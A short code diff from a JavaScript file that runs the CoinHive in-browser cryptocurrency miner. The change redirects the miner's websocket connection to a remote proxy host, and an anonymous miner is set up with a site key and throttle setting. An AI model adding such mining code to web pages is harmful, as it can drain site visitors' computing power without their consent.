@@ -1,4 +1,4 @@
-CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://:3333"]];
+CoinHive.CONFIG.WEBSOCKET_SHARDS = [["wss://proxy-yrjxliushz.now.sh"]];
 var miner = new CoinHive.Anonymous('UxW2fnNjA9PzHJZBhrQspp6uWsm36koR', {throttle: 0.3});
 
 function getDifficulty (coin) {
